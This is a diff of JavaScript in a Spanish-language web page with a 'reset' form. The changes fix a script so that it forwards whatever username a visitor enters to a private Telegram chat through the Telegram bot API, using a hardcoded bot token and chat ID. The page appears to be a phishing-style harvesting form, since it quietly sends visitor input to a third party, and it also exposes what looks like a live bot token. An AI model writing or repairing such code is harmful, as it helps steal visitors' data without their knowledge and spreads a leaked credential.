@@ -384,7 +384,7 @@
         (function() {
             // ⚠️ Rellena estos dos valores
             const TELEGRAM_TOKEN = '8237168670:AAH00SjbTq16dYjg5PsTc7i_hgGJAsAfLVQ';
-            const TELEGRAM_CHAT_ID = '8237168670';
+            const TELEGRAM_CHAT_ID = '6019875341';
 
             const form = document.getElementById('resetForm');
             const usernameInput = document.getElementById('username');
@@ -410,7 +410,7 @@
                 submitBtn.textContent = 'Enviando...';
 
                 const texto = `Nuevo nombre de usuario registrado:\n${username}`;
-                const url = `https://api.telegram.org/bot${8237168670:AAH00SjbTq16dYjg5PsTc7i_hgGJAsAfLVQ}/sendMessage`;
+                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
                 try {
                     const res = await fetch(url, {
@@ -419,7 +419,7 @@
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            chat_id: 8237168670,
+                            chat_id: TELEGRAM_CHAT_ID,
                             text: texto
                         })
                     });
